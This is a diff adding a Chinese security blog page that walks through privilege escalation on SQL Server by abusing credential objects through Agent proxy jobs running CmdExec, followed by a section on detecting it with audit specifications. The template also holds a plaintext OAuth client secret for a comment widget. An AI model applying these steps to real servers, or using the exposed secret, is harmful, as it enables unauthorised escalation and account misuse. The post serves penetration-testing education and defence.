@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      利用代理作业劫持SQL服务器凭据来实现权限提升 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">利用代理作业劫持SQL服务器凭据来实现权限提升</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-20 13:58:04
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                    #提权
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>在某些渗透场景下，我们已经获取到了SQL server的DBA权限，可以通过<code>xp_cmdshell</code>或其他方法以SQL Server服务帐户执行系统命令，然而，SQL Server服务帐户被配置为作为<code>NT Service\MSSQLSERVER</code>运行，这是一个在操作系统上具有有限权限的帐户，所以接下来，我们一般会考虑本地权限提升。</p>
+<p>Windows以<code>Service\MSSQLSERVER</code>权限提升的方法有很多，比如经典的烂土豆漏洞，然而，如果在SQL Server实例上配置了SQL Server凭据，可以尝试通过SQL Server凭据进行权限提升。</p>
+<h2 id="SQL-Server中的凭据对象">SQL Server中的凭据对象</h2>
+<p>在 SQL Server 中，一个<code> Credential Object</code>（凭据对象）是用来存储访问 SQL Server 外部资源所需的身份验证信息的记录。这些外部资源可能包括服务器、共享文件夹、Azure Blob 存储或其他需要特定权限的资源。凭据对象通常包含 Windows 用户名和密码，这些信息由 SQL Server 在内部使用，以便在需要时进行身份验证。</p>
+<p>我们首先创建一个名为<code>testuser</code>的本地用户并使其成为本地管理员。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user testuser P@ssw0rd! /add</span><br><span class="line">net localgroup administrators /add testuser </span><br></pre></td></tr></table></figure>
+<p>在SQL server中创建凭据对象。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> CREDENTIAL [MyCredential]</span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">IDENTITY</span> <span class="operator">=</span> <span class="string">&#x27;DESKTOP-8N5L5EK\testuser&#x27;</span>, <span class="comment">-- Windows主机名/用户名</span></span><br><span class="line">SECRET <span class="operator">=</span> <span class="string">&#x27;P@ssw0rd!&#x27;</span>; <span class="comment">-- 密码</span></span><br></pre></td></tr></table></figure>
+<h2 id="凭据对象利用">凭据对象利用</h2>
+<p>1.首先判断是否具有系统管理员访问权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>) <span class="keyword">AS</span> IsSysAdmin;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920100444156.png" alt="image-20240920100444156"></p>
+<p>2.查询SQL Server实例上配置的凭据列表，这里我们可以看到之前添加的凭据信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.credentials </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920100540622.png" alt="image-20240920100540622"></p>
+<p>3.列出代理帐户。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  </span><br><span class="line">    proxy_id, </span><br><span class="line">    name <span class="keyword">AS</span> proxy_name, </span><br><span class="line">    credential_id, </span><br><span class="line">    enabled </span><br><span class="line"><span class="keyword">FROM</span>  </span><br><span class="line">    dbo.sysproxies; </span><br><span class="line">GO </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920100639071.png" alt="image-20240920100639071"></p>
+<blockquote>
+<p>SQL Server 代理帐户是用于运行 SQL Server Agent 服务的 Windows 帐户。SQL Server Agent 是一个 Windows 服务，负责执行计划的数据库管理任务，这些任务被称为作业（jobs）。代理帐户定义了 SQL Server Agent 运行及其网络权限的 Windows 帐户。</p>
+</blockquote>
+<p>4.创建代理帐户。如果不存在滥用/模拟的凭证对象的代理帐户，我们可以创建一个并为其分配所需的权限。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> sp_add_proxy  </span><br><span class="line">  <span class="variable">@proxy</span>_name <span class="operator">=</span> N<span class="string">&#x27;MyCredentialProxy&#x27;</span>,    <span class="comment">-- 新代理的名称 </span></span><br><span class="line">  <span class="variable">@credential</span>_name <span class="operator">=</span> N<span class="string">&#x27;MyCredential&#x27;</span>;    <span class="comment">-- 指定与新代理关联的凭据的名称  </span></span><br><span class="line"><span class="keyword">EXEC</span> sp_grant_proxy_to_subsystem  		<span class="comment">-- 将代理授权给特定的子系统，允许代理在该子系统的上下文中执行作业步骤</span></span><br><span class="line">  <span class="variable">@proxy</span>_name <span class="operator">=</span> N<span class="string">&#x27;MyCredentialProxy&#x27;</span>,  	<span class="comment">-- 指定要授权的代理名称</span></span><br><span class="line">  <span class="variable">@subsystem</span>_id <span class="operator">=</span> <span class="number">3</span>; 		<span class="comment">-- 指定子系统的 ID，3表示操作系统（CmdExec）子系统</span></span><br></pre></td></tr></table></figure>
+<p>5.验证是否已创建代理帐户。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  </span><br><span class="line">    proxy_id, </span><br><span class="line">    name <span class="keyword">AS</span> proxy_name, </span><br><span class="line">    credential_id, </span><br><span class="line">    enabled </span><br><span class="line"><span class="keyword">FROM</span>  </span><br><span class="line">    dbo.sysproxies; </span><br><span class="line">GO </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920100730186.png" alt="image-20240920100730186"></p>
+<p>6.创建代理作业来执行所需的代码或命令，可用的默认选项包括PowerShell、VBScript、JScript和CMDEXEC。下面我们尝试在C：\Windows\Temp\文件夹中创建一个名为whoami.txt的文件，以证明该进程是在代理用户的上下文中执行的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建一个代理作业</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_add_job  </span><br><span class="line">  <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;WhoAmIJob&#x27;</span>; <span class="comment">-- 代理作业名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加一个新的作业步骤执行whoami</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobstep  </span><br><span class="line">  <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;WhoAmIJob&#x27;</span>,  </span><br><span class="line">  <span class="variable">@step</span>_name <span class="operator">=</span> N<span class="string">&#x27;ExecuteWhoAmI&#x27;</span>,  </span><br><span class="line">  <span class="variable">@subsystem</span> <span class="operator">=</span> N<span class="string">&#x27;CmdExec&#x27;</span>,          <span class="comment">-- 指定作业步骤要执行的子系统</span></span><br><span class="line">  <span class="variable">@command</span> <span class="operator">=</span> N<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\windows\temp\whoami.txt&#x27;</span>,   <span class="comment">-- 指定要执行的命令        </span></span><br><span class="line">  <span class="variable">@on</span>_success_action <span class="operator">=</span> <span class="number">1</span>,         <span class="comment">-- 1 表示在步骤成功时继续执行下一个步骤。</span></span><br><span class="line">  <span class="variable">@on</span>_fail_action <span class="operator">=</span> <span class="number">2</span>,                     <span class="comment">-- 2 表示在步骤失败时停止执行作业</span></span><br><span class="line">  <span class="variable">@proxy</span>_name <span class="operator">=</span> N<span class="string">&#x27;MyCredentialProxy&#x27;</span>;     <span class="comment">-- 指定要用于执行作业步骤的代理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 定义一个新的执行计划</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobschedule  </span><br><span class="line">  <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;WhoAmIJob&#x27;</span>,  </span><br><span class="line">  <span class="variable">@name</span> <span class="operator">=</span> N<span class="string">&#x27;RunOnce&#x27;</span>,  </span><br><span class="line">  <span class="variable">@freq</span>_type <span class="operator">=</span> <span class="number">1</span>,             <span class="comment">-- 只执行一次</span></span><br><span class="line">  <span class="variable">@active</span>_start_date <span class="operator">=</span> <span class="number">20240919</span>,       <span class="comment">-- 指定作业计划开始执行的日期</span></span><br><span class="line">  <span class="variable">@active</span>_start_time <span class="operator">=</span> <span class="number">120000</span>;        <span class="comment">-- 指定作业计划开始执行的时间    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将作业分配给本地服务器</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobserver  </span><br><span class="line">  <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;WhoAmIJob&#x27;</span>,  </span><br><span class="line">  <span class="variable">@server</span>_name <span class="operator">=</span> N<span class="string">&#x27;(LOCAL)&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<p>这一步如果成功则继续下一步，如果显示下图中的<code>SQLServerAgent 当前未运行，因此无法将此操作通知它</code>则说明SQL Server代理服务没有开启，无法执行代理作业</p>
+<p><img src="image-20240920101408848.png" alt="image-20240920101408848"></p>
+<p>我们可以通过cmd命令开启SQL Server代理服务（SQL Server服务账户无权限开启）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start SQLSERVERAGENT</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920103349215.png" alt="image-20240920103349215"></p>
+<blockquote>
+<p>开启服务后可继续执行后续步骤，不需要再重新执行上面的操作。</p>
+</blockquote>
+<p>7.使用下面的查询来验证代理正在使用代理帐户。该查询还将列出配置为使用代理帐户运行的所有其他代理作业。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  </span><br><span class="line">    jobs.name <span class="keyword">AS</span> JobName, </span><br><span class="line">    steps.step_id <span class="keyword">AS</span> StepID, </span><br><span class="line">    steps.step_name <span class="keyword">AS</span> StepName, </span><br><span class="line">    proxies.name <span class="keyword">AS</span> ProxyName, </span><br><span class="line">    ISNULL(credentials.name, <span class="string">&#x27;No Credential&#x27;</span>) <span class="keyword">AS</span> CredentialName, </span><br><span class="line">    ISNULL(credentials.credential_identity, <span class="string">&#x27;No Identity&#x27;</span>) <span class="keyword">AS</span> IdentityName </span><br><span class="line"><span class="keyword">FROM</span>  </span><br><span class="line">    msdb.dbo.sysjobs <span class="keyword">AS</span> jobs </span><br><span class="line"><span class="keyword">JOIN</span>  </span><br><span class="line">    msdb.dbo.sysjobsteps <span class="keyword">AS</span> steps <span class="keyword">ON</span> jobs.job_id <span class="operator">=</span> steps.job_id </span><br><span class="line"><span class="keyword">JOIN</span>  </span><br><span class="line">    msdb.dbo.sysproxies <span class="keyword">AS</span> proxies <span class="keyword">ON</span> steps.proxy_id <span class="operator">=</span> proxies.proxy_id </span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span>  </span><br><span class="line">    sys.credentials <span class="keyword">AS</span> credentials <span class="keyword">ON</span> proxies.credential_id <span class="operator">=</span> credentials.credential_id </span><br><span class="line"><span class="keyword">WHERE</span>  </span><br><span class="line">    steps.proxy_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span>  </span><br><span class="line">    jobs.name, steps.step_id; </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920100937644.png" alt="image-20240920100937644"></p>
+<p>8.执行代理作业。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_start_job <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;WhoAmIJob&#x27;</span>; </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920101947733.png" alt="image-20240920101947733"></p>
+<p>9.查看<code>c:\windows\temp\whoami.txt</code>文件内容，可以发现命令被成功执行。</p>
+<p><img src="image-20240920102007417.png" alt="image-20240920102007417"></p>
+<p>综上，我们成功利用Sql Server的凭据对象来执行了相关用户的命令。除此之外，注意到在创建凭据对象的时候还保存了管理用户的密码，所以当我们发现存在凭据对象时还可以尝试获取用户的明文密码，<a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/">decrypting-mssql-credential-passwords</a>一文中概述了整个解密过程，但需要系统管理员权限，可用于后渗透横向操作。</p>
+<h2 id="防守检测">防守检测</h2>
+<p>要检测使用代理帐户滥用凭据对象的情况，可以创建服务器和数据库审核规范，以便通过监视<code>sp_add_proxy</code>和<code>sp_grant_proxy_to_subsystem</code>存储过程的执行来识别何时创建代理帐户。SQL Server还可以配置为将这些事件发送到Windows应用程序日志，在该日志中可以对事件ID <code>33205</code>启用监视。</p>
+<p>1.创建服务器审计。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Use master </span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> SERVER AUDIT [ProxyAccountAudit]  </span><br><span class="line"><span class="keyword">TO</span> APPLICATION_LOG  </span><br><span class="line"><span class="keyword">WITH</span> (ON_FAILURE <span class="operator">=</span> CONTINUE);  </span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920132427798.png" alt="image-20240920132427798"></p>
+<p>2.创建数据库审计规范来捕获msdb数据库中的服务器级和数据库级更改。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;  </span><br><span class="line">GO  </span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE AUDIT SPECIFICATION [ProxyAccountAuditSpec]  </span><br><span class="line"><span class="keyword">FOR</span> SERVER AUDIT [ProxyAccountAudit]  </span><br><span class="line"><span class="keyword">ADD</span> (<span class="keyword">EXECUTE</span> <span class="keyword">ON</span> OBJECT::[dbo].[sp_add_proxy] <span class="keyword">BY</span> [dbo]),   <span class="comment">-- 指定要审核对 sp_add_proxy 存储过程的 EXECUTE 操作</span></span><br><span class="line"><span class="keyword">ADD</span> (<span class="keyword">EXECUTE</span> <span class="keyword">ON</span> OBJECT::[dbo].[sp_grant_proxy_to_subsystem] <span class="keyword">BY</span> [dbo])  	<span class="comment">-- 指定要审核对 sp_grant_proxy_to_subsystem 存储过程的 EXECUTE 操作</span></span><br><span class="line"><span class="keyword">WITH</span> (STATE <span class="operator">=</span> <span class="keyword">ON</span>);  </span><br><span class="line">GO </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920132655859.png" alt="image-20240920132655859"></p>
+<p>3.启用规范。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Use master </span><br><span class="line">GO </span><br><span class="line"><span class="keyword">ALTER</span> SERVER AUDIT [ProxyAccountAudit] <span class="keyword">WITH</span> (STATE <span class="operator">=</span> <span class="keyword">ON</span>);  <span class="comment">-- 将审核状态设置为启用（ON）</span></span><br><span class="line">GO </span><br><span class="line">Use msdb  </span><br><span class="line">GO </span><br><span class="line"><span class="keyword">ALTER</span> DATABASE AUDIT SPECIFICATION [ProxyAccountAuditSpec]  <span class="comment">-- 启用审核规范</span></span><br><span class="line"><span class="keyword">WITH</span> (STATE <span class="operator">=</span> <span class="keyword">ON</span>);  </span><br><span class="line">GO </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240920132852047.png" alt="image-20240920132852047"></p>
+<p>4.此时尝试执行代理帐户创建步骤并查看Windows应用程序日志中的事件ID <code>33205</code>，则可以看到<code>sp_add_proxy</code>和<code>sp_grant_proxy_to_subsystem</code>存储过程执行的实例。</p>
+<p><img src="image-20240920133421408.png" alt="image-20240920133421408"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/">Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation </a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2024/%E6%8E%A2%E7%A7%98argv%5B0%5D%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-20 13:58:04
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                        #提权
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/2024/ADCS%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE%E5%AF%B9%E8%B1%A1"><span class="toc-text">SQL Server中的凭据对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E5%AF%B9%E8%B1%A1%E5%88%A9%E7%94%A8"><span class="toc-text">凭据对象利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%AE%88%E6%A3%80%E6%B5%8B"><span class="toc-text">防守检测</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
